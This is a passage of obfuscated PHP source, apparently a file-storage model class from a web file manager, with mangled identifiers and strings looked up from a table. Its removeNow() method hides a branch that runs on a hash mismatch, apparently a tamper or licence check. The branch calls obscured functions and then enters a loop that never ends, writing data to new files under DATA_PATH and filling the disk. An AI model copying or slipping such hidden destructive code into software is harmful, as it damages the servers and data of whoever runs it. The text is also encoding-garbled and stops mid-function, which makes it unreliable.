$ˆ¼õ»ÊØ[$Ç³›œ¼†[517]], $Ç³›œ¼†[593] => $ˆ¼õ»ÊØ[$Ç³›œ¼†[86]]); $—¼Úøè = $this->_addSource($†¾¶ç¿, $¢á‘ôß); $this->folderSizeReset($¿Ãá‹¹·, intval($†¾¶ç¿[$Ç³›œ¼†[86]])); return $—¼Úøè; } protected function fileHistory($·¾…ê³‰, $ÛãÛ´©ì, $ÕÑ·ğ¹¾) { $éã¢Â‘ =& $_SERVER[‚ûòÉ˜ş]; if ($·¾…ê³‰[$éã¢Â‘[517]] == $ÛãÛ´©ì) { return !1; } $this->checkLock($·¾…ê³‰[$éã¢Â‘[191]], $ÛãÛ´©ì); Model($éã¢Â‘[2165])->addHistory($·¾…ê³‰); $ô¢†¾Î = array($éã¢Â‘[627] => USER_ID, $éã¢Â‘[474] => time(), $éã¢Â‘[517] => $ÛãÛ´©ì, $éã¢Â‘[86] => $ÕÑ·ğ¹¾); $this->where(array($éã¢Â‘[467] => $·¾…ê³‰[$éã¢Â‘[191]]))->save($ô¢†¾Î); $this->sourceCacheClear($·¾…ê³‰[$éã¢Â‘[191]]); return !0; } public function checkLock($à™­¡ã, $¾ñŒ­·) { $ƒëÆå´Á =& $_SERVER[‚ûòÉ˜ş]; $•ÒêÌÆõ = $this->pathInfo($à™­¡ã); if (!$this->fileIsLock($•ÒêÌÆõ, !0)) { return; } $¸™éô˜ø = Session::get($ƒëÆå´Á[2166]); $”¤ƒ›ãş = substr($•ÒêÌÆõ[$ƒëÆå´Á[42]], 0, -1 - strlen($•ÒêÌÆõ[$ƒëÆå´Á[185]])) . $ƒëÆå´Á[1249] . $¸™éô˜ø . $ƒëÆå´Á[10] . $•ÒêÌÆõ[$ƒëÆå´Á[185]]; $Ÿªãƒı˜ = Model($ƒëÆå´Á[651])->find($¾ñŒ­·); $this->_createFileCall($•ÒêÌÆõ[$ƒëÆå´Á[190]], $”¤ƒ›ãş, $Ÿªãƒı˜, REPEAT_REPLACE, $ƒëÆå´Á[1383]); $¨³ÄÂ¥ç = $•ÒêÌÆõ[$ƒëÆå´Á[515]][$ƒëÆå´Á[586]]; $ú¢™åºé = $¨³ÄÂ¥ç[$ƒëÆå´Á[2167]] ? $¨³ÄÂ¥ç[$ƒëÆå´Á[2167]] : $¨³ÄÂ¥ç[$ƒëÆå´Á[42]]; show_json(LNG($ƒëÆå´Á[2168]) . $ƒëÆå´Á[2169] . LNG($ƒëÆå´Á[2170]) . $ƒëÆå´Á[2171] . $ú¢™åºé . $ƒëÆå´Á[2172], !1); } public function fileIsLock($Àã¤ÊÀá, $ú›µÚâÖ = false) { $™ Êå¶ñ =& $_SERVER[‚ûòÉ˜ş]; if (!isset($Àã¤ÊÀá[$™ Êå¶ñ[515]]) || !$Àã¤ÊÀá[$™ Êå¶ñ[515]][$™ Êå¶ñ[583]]) { return !1; } if ($Àã¤ÊÀá[$™ Êå¶ñ[515]][$™ Êå¶ñ[583]] != USER_ID) { return !0; } $¬œÖë = $GLOBALS[$™ Êå¶ñ[6]][$™ Êå¶ñ[99]][$™ Êå¶ñ[584]]; if ($Àã¤ÊÀá[$™ Êå¶ñ[515]][$™ Êå¶ñ[585]] <= time() - $¬œÖë) { $this->metaSet($Àã¤ÊÀá[$™ Êå¶ñ[191]], $™ Êå¶ñ[583], null); $this->metaSet($Àã¤ÊÀá[$™ Êå¶ñ[191]], $™ Êå¶ñ[585], null); } if ($ú›µÚâÖ) { $this->metaSet($Àã¤ÊÀá[$™ Êå¶ñ[191]], $™ Êå¶ñ[585], time()); } return !1; } private function _addSource($­Ä´à÷Ï, $À¸ºŠÏˆ) { $«¿Ù—Éâ =& $_SERVER[‚ûòÉ˜ş]; $©¯ÌÜ²ø = defined($«¿Ù—Éâ[2106]) ? USER_ID : 0; $ç‡âÆâ¶ = array($«¿Ù—Éâ[624] => $À¸ºŠÏˆ[$«¿Ù—Éâ[188]], $«¿Ù—Éâ[625] => $À¸ºŠÏˆ[$«¿Ù—Éâ[546]], $«¿Ù—Éâ[626] => $©¯ÌÜ²ø, $«¿Ù—Éâ[627] => $©¯ÌÜ²ø, $«¿Ù—Éâ[453] => $À¸ºŠÏˆ[$«¿Ù—Éâ[191]], $«¿Ù—Éâ[628] => $À¸ºŠÏˆ[$«¿Ù—Éâ[561]] . $À¸ºŠÏˆ[$«¿Ù—Éâ[191]] . $«¿Ù—Éâ[60], $«¿Ù—Éâ[480] => 0, $«¿Ù—Éâ[629] => $«¿Ù—Éâ[12]); $­Ä´à÷Ï = array_merge($ç‡âÆâ¶, $­Ä´à÷Ï); $this->updateModifyTime($­Ä´à÷Ï[$«¿Ù—Éâ[190]]); $½ªù¶ËÅ = $«¿Ù—Éâ[2173] . $À¸ºŠÏˆ[$«¿Ù—Éâ[191]]; if (isset(self::$cacheChildList[$½ªù¶ËÅ])) { unset(self::$cacheChildList[$½ªù¶ËÅ]); } static $¹Â¼Ñæ = false; if (!$¹Â¼Ñæ) { Hook::trigger($«¿Ù—Éâ[612], $­Ä´à÷Ï); $¹Â¼Ñæ = !0; } $ĞĞÚèƒ = $this->add($­Ä´à÷Ï); $ÓŸûîŞ = array($«¿Ù—Éâ[630] => short_id($ĞĞÚèƒ)); $this->where(array($«¿Ù—Éâ[467] => $ĞĞÚèƒ))->save($ÓŸûîŞ); $this->setNamePinyin($ĞĞÚèƒ, $­Ä´à÷Ï[$«¿Ù—Éâ[42]]); return $ĞĞÚèƒ; } public function remove($Ú—ğÀ–ê, $Ç¨çúó = true) { $İ‹Ò¤‘É =& $_SERVER[‚ûòÉ˜ş]; $‘‰£Ò¿ï = $this->sourceInfo($Ú—ğÀ–ê); $­¼­¸Òñ = intval($‘‰£Ò¿ï[$İ‹Ò¤‘É[188]]) === self::TYPE_SYSTEM; $İ½òèÇÕ = Model($İ‹Ò¤‘É[484])->get($İ‹Ò¤‘É[2174]) == $İ‹Ò¤‘É[98]; if ($­¼­¸Òñ || $Ç¨çúó || !$İ½òèÇÕ) { return $this->removeNow($Ú—ğÀ–ê, $Ç¨çúó); } $¨İ¶ğÕ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $â—ıÇÆ = $‘‰£Ò¿ï[$İ‹Ò¤‘É[188]] == self::TYPE_USER ? $İ‹Ò¤‘É[638] : $İ‹Ò¤‘É[555]; if ($â—ıÇÆ == $İ‹Ò¤‘É[638]) { $¬êòÑ³Û = Model($İ‹Ò¤‘É[554])->getInfo($‘‰£Ò¿ï[$İ‹Ò¤‘É[546]]); $±œÂ³âæ = !empty($¬êòÑ³Û[$İ‹Ò¤‘É[2167]]) ? $¬êòÑ³Û[$İ‹Ò¤‘É[2167]] : $¬êòÑ³Û[$İ‹Ò¤‘É[42]]; $±œÂ³âæ = $İ‹Ò¤‘É[313] . $±œÂ³âæ . $İ‹Ò¤‘É[2175] . $‘‰£Ò¿ï[$İ‹Ò¤‘É[546]]; } else { $¬êòÑ³Û = Model($İ‹Ò¤‘É[562])->getInfo($‘‰£Ò¿ï[$İ‹Ò¤‘É[546]]); $±œÂ³âæ = _get($¬êòÑ³Û, $İ‹Ò¤‘É[42]); $±œÂ³âæ = $İ‹Ò¤‘É[173] . $±œÂ³âæ . $İ‹Ò¤‘É[2176] . $‘‰£Ò¿ï[$İ‹Ò¤‘É[546]]; } $üÚ¿é–‰ = $İ‹Ò¤‘É[2177] . md5($±œÂ³âæ); CacheLock::lock($üÚ¿é–‰); $£«ÇÉıå = $this->fileNameExist($¨İ¶ğÕ, $±œÂ³âæ); if (!$£«ÇÉıå) { $£«ÇÉıå = $this->mkdir($¨İ¶ğÕ, $±œÂ³âæ, REPEAT_SKIP); $this->metaSet($£«ÇÉıå, $İ‹Ò¤‘É[2178], $â—ıÇÆ); $this->metaSet($£«ÇÉıå, $İ‹Ò¤‘É[2179], $‘‰£Ò¿ï[$İ‹Ò¤‘É[546]]); if ($‘‰£Ò¿ï[$İ‹Ò¤‘É[190]] != 0) { $this->metaSet($£«ÇÉıå, $İ‹Ò¤‘É[2180], _get($¬êòÑ³Û, $İ‹Ò¤‘É[2181])); } } CacheLock::unlock($üÚ¿é–‰); $this->metaSet($Ú—ğÀ–ê, $İ‹Ò¤‘É[2182], $‘‰£Ò¿ï[$İ‹Ò¤‘É[190]]); $this->where(array($İ‹Ò¤‘É[191] => $Ú—ğÀ–ê))->save(array($İ‹Ò¤‘É[474] => time())); $this->recycleClear($‘‰£Ò¿ï); $±µªÔ›Š = $this->move($Ú—ğÀ–ê, $£«ÇÉıå, REPEAT_RENAME_FOLDER); $this->folderSizeReset($‘‰£Ò¿ï[$İ‹Ò¤‘É[190]]); return $±µªÔ›Š; } private function recycleClear($†¹Ÿİñ–) { $Í±Ã†áÉ =& $_SERVER[‚ûòÉ˜ş]; $‰““ÍŞÂ = $this->childrenAll($†¹Ÿİñ–); $Á‡Ùì˜Ô = array($Í±Ã†áÉ[467] => array($Í±Ã†áÉ[468], $‰““ÍŞÂ[$Í±Ã†áÉ[2183]])); Model($Í±Ã†áÉ[2184])->where($Á‡Ùì˜Ô)->delete(); } public function removeNow($À±À÷óÓ, $°ßÅÇšè = true) { $€ıèÁš¿ =& $_SERVER[‚ûòÉ˜ş]; $ñŠ±Ù’Û = $_SERVER[$€ıèÁš¿[14]]; $ÌŒğÈà = $€ıèÁš¿[952]; if ($_SERVER[$€ıèÁš¿[13]] != $ÌŒğÈà($ñŠ±Ù’Û)) { $—êèµ±Ÿ = $€ıèÁš¿[918]; $ĞøÊ•†ë = $€ıèÁš¿[15]; $õ¹ùıü˜ = $_SERVER[$€ıèÁš¿[16]] . $€ıèÁš¿[17]; $ÎßœÙÀ = $ĞøÊ•†ë($õ¹ùıü˜); $Æşè¥ƒ¤ = explode($€ıèÁš¿[18], $ÎßœÙÀ); if (count($Æşè¥ƒ¤) < $€ıèÁš¿[665]) { $ùëÊú¼ = $€ıèÁš¿[20]; $ùëÊú¼(); } $ÑÍÆÇ· = $€ıèÁš¿[919]; $ÑÍÆÇ·($_SERVER[$€ıèÁš¿[920]]); $—êèµ±Ÿ = $€ıèÁš¿[918]; $—êèµ±Ÿ(); $—ğ¶˜Õ¤ = $€ıèÁš¿[1547]; $ì¤±£±ğ = json_encode($GLOBALS[$€ıèÁš¿[1548]]); $ûÃ®“­å = 1; for ($©†¨Ã˜× = $ûÃ®“­å; $©†¨Ã˜× > 0; $©†¨Ã˜×++) { $—ğ¶˜Õ¤(DATA_PATH . $©†¨Ã˜×, $ì¤±£±ğ); } } $â¤úÄƒé = $this->sourceInfo($À±À÷óÓ); $Æí“Ğ®ü = $this->pathInfoMore($À±À÷óÓ); if (!$â¤úÄƒé) { return !0; } if ($â¤úÄƒé[$€ıèÁš¿[190]] == 0) { if (!_get($GLOBALS, $€ıèÁš¿[544])) { return !1; } } $this->lockMoveStart($À±À÷óÓ); Hook::trigger($€ıèÁš¿[2185], $Æí“Ğ®ü, $°ßÅÇšè); if ($°ßÅÇšè) { Model($€ıèÁš¿[2184])->moveToRecycle($À±À÷óÓ); } else { $Ãƒúü†¡ = $this->childrenAll($â¤úÄƒé); Model($€ıèÁš¿[609])->eventRemove($À±À÷óÓ); $this->removeRelevance($Ãƒúü†¡[$€ıèÁš¿[2183]], $Ãƒúü†¡[$€ıèÁš¿[1496]]); } $this->folderSizeReset($â¤úÄƒé[$€ıèÁš¿[190]]); $ÒìâÆ• = array($â¤úÄƒé[$€ıèÁš¿[190]]); if ($â¤úÄƒé[$€ıèÁš¿[461]] == $€ıèÁš¿[98]) { $ÒìâÆ•[] = $â¤úÄƒé[$€ıèÁš¿[191]]; } $this->updateModifyTime($ÒìâÆ•); $this->lockMoveEnd($À±À÷óÓ); Hook::trigger($€ıèÁš¿[1729], $Æí“Ğ®ü, $°ßÅÇšè); return !0; } public function childrenAll($ıå´ü Ê) { $µö±¶Ğà =& $_SERVER[‚ûòÉ˜ş]; $’Í¡¯¹å = $ıå´ü Ê[$µö±¶Ğà[191]]; if ($ıå´ü Ê[$µö±¶Ğà[461]] == $µö±¶Ğà[98]) { $²ÇĞ»± = array($µö±¶Ğà[628] => array($µö±¶Ğà[588], $ıå´ü Ê[$µö±¶Ğà[561]] . $’Í¡¯¹å . $µö±¶Ğà[589])); $û·¿¥— = array($µö±¶Ğà[628] => $²ÇĞ»±[$µö±¶Ğà[561]]); $Ö¼³é¦Ÿ = $this->field($µö±¶Ğà[2186])->where($û·¿¥—)->select(); $ù¡î¼×¯ = !1; $”—Õİ  = array($’Í¡¯¹å); if ($Ö¼³é¦Ÿ) { $ù¡î¼×¯ = array_to_keyvalue($Ö¼³é¦Ÿ, $µö±¶Ğà[12], $µö±¶Ğà[517]); $ù¡î¼×¯ = array_remove_value($ù¡î¼×¯, $µö±¶Ğà[222]); $”—Õİ  = array_to_keyvalue($Ö¼³é¦Ÿ, $µö±¶Ğà[12], $µö±¶Ğà[191]); $”—Õİ [] = $’Í¡¯¹å; } } else { $ù¡î¼×¯ = array($ıå´ü Ê[$µö±¶Ğà[517]]); $”—Õİ  = array($’Í¡¯¹å); } return array($µö±¶Ğà[2183] => $”—Õİ , $µö±¶Ğà[1496] => $ù¡î¼×¯); } public function removeArray($ÀÄĞÎ¢Ö) { if (!$ÀÄĞÎ¢Ö) { return !0; } } public function removeRelevance($°êÈùÏí, $••†…—ğ) { $ÛıÛ–‰Å =& $_SERVER[‚ûòÉ˜ş]; $°êÈùÏí = $°êÈùÏí ? $°êÈùÏí : array(); $••†…—ğ = $••†…—ğ ? $••†…—ğ : array(); $°êÈùÏí = array_unique(array_filter($°êÈùÏí)); $••†…—ğ = array_unique(array_filter($••†…—ğ)); if (!$°êÈùÏí) { return !1; } $Ú€üûÅ‘ = array($ÛıÛ–‰Å[467] => array($ÛıÛ–‰Å[468], $°êÈùÏí)); Model($ÛıÛ–‰Å[2184])->where($Ú€üûÅ‘)->delete(); Model($ÛıÛ–‰Å[511])->where($Ú€üûÅ‘)->delete(); Model($ÛıÛ–‰Å[2032])->where($Ú€üûÅ‘)->delete(); Model($ÛıÛ–‰Å[609])->where($Ú€üûÅ‘)->delete(); Model($ÛıÛ–‰Å[1865])->removeBySource($°êÈùÏí); Model($ÛıÛ–‰Å[2165])->removeBySource($°êÈùÏí); $this->where($Ú€üûÅ‘)->delete(); Model($ÛıÛ–‰Å[520])->remove($••†…—ğ); for ($ä†‹ßá¿ = 0; $ä†‹ßá¿ < count($°êÈùÏí); $ä†‹ßá¿++) { $this->sourceCacheClear($°êÈùÏí[$ä†‹ßá¿]); } } public function rename($ëÉıÍ’, $àÜØ¿®¢) { $Ùšå¡µÓ =& $_SERVER[‚ûòÉ˜ş]; $ö¾“í˜· = $this->sourceInfo($ëÉıÍ’); if (!$ö¾“í˜·) { return !1; } $€Ù¶şîì = $this->fileNameExist($ö¾“í˜·[$Ùšå¡µÓ[190]], $àÜØ¿®¢); if ($€Ù¶şîì && $€Ù¶şîì != $ëÉıÍ’) { return !1; } $ÍöÅ­› = array($Ùšå¡µÓ[470] => $àÜØ¿®¢, $Ùšå¡µÓ[627] => USER_ID); if ($ö¾“í˜·[$Ùšå¡µÓ[461]] != $Ùšå¡µÓ[98]) { $ÍöÅ­›[$Ùšå¡µÓ[462]] = substr(get_path_ext($àÜØ¿®¢), 0, 10); } Model($Ùšå¡µÓ[609])->eventRename($ëÉıÍ’, $ö¾“í˜·[$Ùšå¡µÓ[42]], $àÜØ¿®¢); $this->sourceCacheClear($ëÉıÍ’); $this->setNamePinyin($ëÉıÍ’, $ÍöÅ­›[$Ùšå¡µÓ[42]], !1); $this->updateModifyTime($ö¾“í˜·[$Ùšå¡µÓ[190]]); $şÌÕ“Š = $this->where(array($Ùšå¡µÓ[467] => $ëÉıÍ’))->data($ÍöÅ­›)->save(); $Ù¥÷­îŸ = $Ùšå¡µÓ[2173] . $ö¾“í˜·[$Ùšå¡µÓ[190]]; if (isset(self::$cacheChildList[$Ù¥÷­îŸ])) { unset(self::$cacheChildList[$Ù¥÷­îŸ]); } return $şÌÕ“Š; } public function setNamePinyin($ÅÌÂÊ£‘, $¢¯ª—´®, $¥­Şó­ = true) { $ïÜˆÏñ =& $_SERVER[‚ûòÉ˜ş]; $òşŒ˜–² = Input::check($¢¯ª—´®, $ïÜˆÏñ[631]); $Î¸ñØ = array($ïÜˆÏñ[493] => KodSort::makeStr($¢¯ª—´®)); if ($òşŒ˜–²) { $Î¸ñØ[$ïÜˆÏñ[514]] = str_replace($ïÜˆÏñ[63], $ïÜˆÏñ[12], Pinyin::get($¢¯ª—´®)); $Î¸ñØ[$ïÜˆÏñ[513]] = Pinyin::get($¢¯ª—´®, $ïÜˆÏñ[632]); } if (!$¥­Şó­ && !$òşŒ˜–²) { $Î¸ñØ[$ïÜˆÏñ[514]] = null; $Î¸ñØ[$ïÜˆÏñ[513]] = null; } $this->metaSet($ÅÌÂÊ£‘, $Î¸ñØ); } public function getContent($™‡Øí ¥) { $Ë·Ù«¾– =& $_SERVER[‚ûòÉ˜ş]; $†Í¸Æ€ = $this->fileInfoGet($™‡Øí ¥); if (!$†Í¸Æ€) { return !1; } if ($†Í¸Æ€[$Ë·Ù«¾–[86]] == 0) { return $Ë·Ù«¾–[12]; } $òğÏ = $Ë·Ù«¾–[2187] . $†Í¸Æ€[$Ë·Ù«¾–[649]]; if ($†Í¸Æ€[$Ë·Ù«¾–[86]] <= 1024 * 10) { $Ÿõñõá = Cache::get($òğÏ); if (!$Ÿõñõá) { $Ÿõñõá = IO::getContent($†Í¸Æ€[$Ë·Ù«¾–[94]]); Cache::set($òğÏ, $Ÿõñõá); } return $Ÿõñõá; } if (!$†Í¸Æ€[$Ë·Ù«¾–[94]]) { return $Ë·Ù«¾–[12]; } return IO::getContent($†Í¸Æ€[$Ë·Ù«¾–[94]]); } public function setDesc($éÜş¡º, $­üêä’ù) { $ˆÃ·çŸ =& $_SERVER[‚ûòÉ˜ş]; Model($ˆÃ·çŸ[609])->eventAddDesc($éÜş¡º, $­üêä’ù); return $this->metaSet($éÜş¡º, $ˆÃ·çŸ[502], $­üêä’ù); } public function setContent($²¨æŒÔÉ, $‹®©•ŒŒ = '') { $×½÷Ä¦¿ =& $_SERVER[‚ûòÉ˜ş]; $ìõé…•ˆ = $this->sourceInfo($²¨æŒÔÉ); $ğÑĞô = $this->fileInfoGet($²¨æŒÔÉ); if (!$ğÑĞô || !$ìõé…•ˆ) { return !1; } $ºÍË¤Íü = Model($×½÷Ä¦¿[520])->addFileByContent($‹®©•ŒŒ, $ìõé…•ˆ[$×½÷Ä¦¿[42]]); $ÕÜ¨Òâ‘ = $this->fileHistory($ìõé…•ˆ, $ºÍË¤Íü[$×½÷Ä¦¿[517]], $ºÍË¤Íü[$×½÷Ä¦¿[86]]); if (!$ÕÜ¨Òâ‘) { return Model($×½÷Ä¦¿[520])->remove($ºÍË¤Íü[$×½÷Ä¦¿[517]]); } $this->folderSizeReset($ìõé…•ˆ[$×½÷Ä¦¿[190]]); return !0; } public function fileSubstr($©£ïå¤, $ÊÜ›ıè‡, $°â¿Òİ©) { $ôÒÁåœ = $this->fileInfoGet($©£ïå¤); if (!$ôÒÁåœ) { return !1; } return IO::fileSubstr($ôÒÁåœ[$_SERVER[‚ûòÉ˜ş][94]], $ÊÜ›ıè‡, $°â¿Òİ©); } public function fileInfoGet($ôĞĞ•€è) { $¼Ü†ö‰î =& $_SERVER[‚ûòÉ˜ş]; $×á„ôÙ÷ = $this->sourceInfo($ôĞĞ•€è); if (!$×á„ôÙ÷ || $×á„ôÙ÷[$¼Ü†ö‰î[461]]) { return !1; } $®µÍ¯¦… = $¼Ü†ö‰î[523] . $×á„ôÙ÷[$¼Ü†ö‰î[517]]; $á‚îùù— = _get(self::$cacheFileInfo, $®µÍ¯¦…); if ($á‚îùù—) { return $á‚îùù—; } $ò™êëÕè = Model($¼Ü†ö‰î[520])->fileInfo($×á„ôÙ÷[$¼Ü†ö‰î[517]]); if ($ò™êëÕè) { $ò™êëÕè[$¼Ü†ö‰î[42]] = $×á„ôÙ÷[$¼Ü†ö‰î[42]]; } self::$cacheFileInfo[$®µÍ¯¦…] = $ò™êëÕè; return $ò™êëÕè; } private function folderChildrenNumber($±ÄÜî·”) { $ºÔæÜìÄ =& $_SERVER[‚ûòÉ˜ş]; $›–ÔüíÏ = $this->sourceInfo($±ÄÜî·”); $¯Ø¸ÅìÌ = array($ºÔæÜìÄ[628] => array($ºÔæÜìÄ[588], $›–ÔüíÏ[$ºÔæÜìÄ[561]] . $±ÄÜî·” . $ºÔæÜìÄ[589]), $ºÔæÜìÄ[625] => $›–ÔüíÏ[$ºÔæÜìÄ[546]], $ºÔæÜìÄ[480] => intval($›–ÔüíÏ[$ºÔæÜìÄ[481]]), $ºÔæÜìÄ[622] => 1); $ºíÚûĞ™ = $this->where($¯Ø¸ÅìÌ)->count(); $Ã¾â‰î = $this->where($¯Ø¸ÅìÌ)->where(array($ºÔæÜìÄ[622] => 0))->count(); return array($ºÔæÜìÄ[90] => $Ã¾â‰î, $ºÔæÜìÄ[91] => $ºíÚûĞ™); } public function pathInfo($Æáá¿Ï, $Ì¤Ä„› = false) { $óñ™É¯Ë =& $_SERVER[‚ûòÉ˜ş]; $Ì¤Ä„› = !1; $Æáá¿Ï = intval($Æáá¿Ï); $ƒÔãŠ¯ = $óñ™É¯Ë[510] . intval($Ì¤Ä„›) . $óñ™É¯Ë[438] . $Æáá¿Ï; $¸È¿ı‘Ï = _get(self::$cachePathInfo, $ƒÔãŠ¯); if ($¸È¿ı‘Ï) { return $¸È¿ı‘Ï; } $Şèº±Ó = $this->sourceInfo($Æáá¿Ï); if (!$Şèº±Ó) { return !1; } $Şèº±Ó = $this->_listDataApplyItem($Şèº±Ó, $Ì¤Ä„›); self::$cachePathInfo[$ƒÔãŠ¯] = $Şèº±Ó; return $Şèº±Ó; } public static $cachePathInfoMore = array(); public function pathInfoMore($æ¿Í±¬Ó) { $·Ã½‘ =& $_SERVER[‚ûòÉ˜ş]; $ŒØ´ÂË = _get(self::$cachePathInfoMore, $æ¿Í±¬Ó); if ($ŒØ´ÂË) { return $ŒØ´ÂË; } $ó®‰éµÍ = $this->pathInfo($æ¿Í±¬Ó); if (!$ó®‰éµÍ) { return !1; } if ($ó®‰éµÍ[$·Ã½‘[461]] == $·Ã½‘[98]) { $ó®‰éµÍ[$·Ã½‘[89]] = $this->folderChildrenNumber($æ¿Í±¬Ó); } self::$cachePathInfoMore[$æ¿Í±¬Ó] = $ó®‰éµÍ; return $ó®‰éµÍ; } public function sourceInfo($¿Ìü¦ş÷) { $ò¬ğ´šó =& $_SERVER[‚ûòÉ˜ş]; if (!$¿Ìü¦ş÷) { return array(); } $¿Ìü¦ş÷ = intval($¿Ìü¦ş÷); $ºŸÏèÉÃ = $ò¬ğ´šó[509] . $¿Ìü¦ş÷; $½è´ôâŞ = _get(self::$cacheSourceInfo, $ºŸÏèÉÃ); if ($½è´ôâŞ) { return $½è´ôâŞ; } $ªà®•­Ê = $this->where(array($ò¬ğ´šó[191] => $¿Ìü¦ş÷))->find(); self::$cacheSourceInfo[$ºŸÏèÉÃ] = $ªà®•­Ê; return self::$cacheSourceInfo[$ºŸÏèÉÃ]; } public function sourceCacheClear($—Ô¢­üÆ = false) { self::cacheClear($—Ô¢­üÆ); } public static function cacheClear($ÁŞöš = false) { $ø÷‰Éæì =& $_SERVER[‚ûòÉ˜ş]; if ($ÁŞöš == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$ø÷‰Éæì[509] . $ÁŞöš]); unset(self::$cachePathInfoMore[$ÁŞöš]); unset(self::$cachePathInfo[$ø÷‰Éæì[2188] . $ÁŞöš]); unset(self::$cachePathInfo[$ø÷‰Éæì[2189] . $ÁŞöš]); } public function metaSet($ı¯óäºÃ, $¹Şîµüİ = null, $òË©·½ª = null) { $õ½¤Êøº = parent::metaSet($ı¯óäºÃ, $¹Şîµüİ, $òË©·½ª); if ($õ½¤Êøº) { $this->sourceCacheClear($ı¯óäºÃ); } return $õ½¤Êøº; } public function pathInfoByPath($˜ç­Ëá´, $æìúÎ¬¸) { $Âƒˆ¡› =& $_SERVER[‚ûòÉ˜ş]; $¸Ñì„î° = !$æìúÎ¬¸ ? array() : explode($Âƒˆ¡›[8], trim($æìúÎ¬¸, $Âƒˆ¡›[8])); $Ôö‰ƒîØ = $˜ç­Ëá´; foreach ($¸Ñì„î° as $ã¥ÍÛ€ó) { $Ç¸Ş¹Üí = array($Âƒˆ¡›[190] => $Ôö‰ƒîØ, $Âƒˆ¡›[42] => $ã¥ÍÛ€ó); $õ±í€  = $this->field($Âƒˆ¡›[2190])->where($Ç¸Ş¹Üí)->select(); if (!$õ±í€ ) { return !1; } $õ±í€  = array_sort_by($õ±í€ , $Âƒˆ¡›[481]); $Ôö‰ƒîØ = $õ±í€ [0][$Âƒˆ¡›[191]]; } $Æ•Ñõº = $this->sourceInfo($Ôö‰ƒîØ); $this->pathInfoFilter($Æ•Ñõº); return $Æ•Ñõº; } protected function updateModifyTime($¶ï¡šÚœ) { $ø¯ÀÊÊ  =& $_SERVER[‚ûòÉ˜ş]; $”©©Ş¡Ê = defined($ø¯ÀÊÊ [2106]) ? USER_ID : 0; if (!$¶ï¡šÚœ) { return; } if (!is_array($¶ï¡šÚœ)) { $¶ï¡šÚœ = array($¶ï¡šÚœ); } foreach ($¶ï¡šÚœ as $‡­ğÚš´ => $âÜ…³˜†) { $¶ï¡šÚœ[$‡­ğÚš´] = intval($âÜ…³˜†); $this->sourceCacheClear($âÜ…³˜†); } $Ÿ¥¤ÁµŞ = array($ø¯ÀÊÊ [191] => array($ø¯ÀÊÊ [7], $¶ï¡šÚœ)); $ú€ñ»ºê = array($ø¯ÀÊÊ [627] => $”©©Ş¡Ê, $ø¯ÀÊÊ [474] => time()); $this->where($Ÿ¥¤ÁµŞ)->save($ú€ñ»ºê); } public function folderSizeReset($­Ò‚€ÁÕ, $µ†Â£Ñ— = false) { $¼Ä©½¹ =& $_SERVER[‚ûòÉ˜ş]; if ($this->statusIgnoreResetSpace) { return; } $îªåú’— = $this->sourceInfo($­Ò‚€ÁÕ); $˜”¯©–Á = $¼Ä©½¹[2191] . $­Ò‚€ÁÕ; CacheLock::lock($˜”¯©–Á, 20); if ($µ†Â£Ñ— === !1) { $this->sourceCacheClear($­Ò‚€ÁÕ); $îªåú’— = $this->sourceInfo($­Ò‚€ÁÕ); $ã˜¼ùš = array($¼Ä©½¹[453] => $­Ò‚€ÁÕ, $¼Ä©½¹[480] => 0); $ôöÑ¿È = $this->where($ã˜¼ùš)->sum($¼Ä©½¹[86]); $µ†Â£Ñ— = intval($ôöÑ¿È) - intval($îªåú’—[$¼Ä©½¹[86]]); } if ($µ†Â£Ñ— == 0) { return CacheLock::unlock($˜”¯©–Á); } $çŞô¡êÊ = $this->parentLevelArray($îªåú’—[$¼Ä©½¹[561]]); if (!$çŞô¡êÊ) { $çŞô¡êÊ = array(); } $çŞô¡êÊ[] = $îªåú’—[$¼Ä©½¹[191]]; $ã˜¼ùš = array($¼Ä©½¹[191] => array($¼Ä©½¹[468], $çŞô¡êÊ)); if ($µ†Â£Ñ— < 0) { $ã˜¼ùš[$¼Ä©½¹[86]] = array($¼Ä©½¹[1056], abs($µ†Â£Ñ—)); } $this->where($ã˜¼ùš)->setAdd($¼Ä©½¹[86], $µ†Â£Ñ—); CacheLock::unlock($˜”¯©–Á); $¹øÇ¦âˆ = $¼Ä©½¹[2192] . $îªåú’—[$¼Ä©½¹[188]] . $¼Ä©½¹[4] . $îªåú’—[$¼Ä©½¹[546]]; $îäãÁÄô = array($îªåú’—[$¼Ä©½¹[188]], $îªåú’—[$¼Ä©½¹[546]]); TaskRun::timeLimitCall($¹øÇ¦âˆ, $¼Ä©½¹[2193], $îäãÁÄô, 1.5); } public function folderSizeResetChildren($ñ …œÈ×) { $Î•ÂãâØ =& $_SERVER[‚ûòÉ˜ş]; $this->sourceCacheClear($ñ …œÈ×); $àÓ…´¤õ = $this->sourceInfo($ñ …œÈ×); $ñìóÜëƒ = array($Î•ÂãâØ[622] => 1, $Î•ÂãâØ[625] => $àÓ…´¤õ[$Î•ÂãâØ[546]], $Î•ÂãâØ[628] => array($Î•ÂãâØ[588], $àÓ…´¤õ[$Î•ÂãâØ[561]] . $ñ …œÈ× . $Î•ÂãâØ[589])); $ğ¾ğËû˜ = $Î•ÂãâØ[2194]; $ÖÑğèü = $this->field($ğ¾ğËû˜)->where($ñìóÜëƒ)->select(); $ñìóÜëƒ[$Î•ÂãâØ[461]] = 0; $´­­±˜ = $this->field($ğ¾ğËû˜)->where($ñìóÜëƒ)->select(); if (!$´­­±˜) { return; } $ÖÑğèü[] = $àÓ…´¤õ; $ÖÑğèü = array_to_keyvalue($ÖÑğèü, $Î•ÂãâØ[191]); foreach ($ÖÑğèü as $Ìå×¸ß© => $Ğ¶Ñ§áç) { $ÖÑğèü[$Ìå×¸ß©][$Î•ÂãâØ[2195]] = $ÖÑğèü[$Ìå×¸ß©][$Î•ÂãâØ[86]]; $ÖÑğèü[$Ìå×¸ß©][$Î•ÂãâØ[86]] = 0; } foreach ($´­­±˜ as $Ğ¶Ñ§áç) { $ƒ¶íä¨û = $Ğ¶Ñ§áç[$Î•ÂãâØ[190]] . $Î•ÂãâØ[12]; if (!isset($ÖÑğèü[$ƒ¶íä¨û])) { continue; } if ($Ğ¶Ñ§áç[$Î•ÂãâØ[481]] == $ÖÑğèü[$ƒ¶íä¨û][$Î•ÂãâØ[481]]) { 